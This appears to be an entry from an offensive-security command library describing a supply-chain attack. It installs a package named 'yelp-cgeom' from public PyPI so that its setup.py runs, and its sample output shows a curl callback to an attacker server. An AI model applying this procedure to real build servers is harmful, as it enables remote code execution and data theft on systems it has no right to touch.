---
id: cmd-002
data: pip install yelp-cgeom
tags:
  - install
  - rce
type: command
output: |-
  Collecting yelp-cgeom
    Downloading yelp-cgeom-1.0.0.tar.gz (1.2 kB)
    Preparing metadata (setup.py) ... done
  Building wheels for collected packages: yelp-cgeom
    Building wheel for yelp-cgeom (setup.py) ... done
  Successfully built yelp-cgeom
  Installing collected packages: yelp-cgeom
  Successfully installed yelp-cgeom-1.0.0
  [Callback executed: curl to attacker server]
executor: bash
platforms:
  - Linux
  - Python
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:17.619Z'
verified: false
validated: true
submitted: true
---
---
# pip-install-package

## Command

```bash
pip install yelp-cgeom
```

## Description

Installs a Python package via pip, which in misconfigured environments fetches from public PyPI and executes setup.py, enabling RCE in supply chain attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `yelp-cgeom` | Package name to install | Yes |

## Examples

### Basic Usage

```bash
pip install yelp-cgeom
```

### Advanced Usage

```bash
pip install --index-url https://pypi.org/simple/ yelp-cgeom
```

## Expected Output

Installation success with potential setup.py execution (e.g., network callback).

## Related

- [[Related Procedure: Trigger-Installation-on-Build-Server-for-RCE]]
---
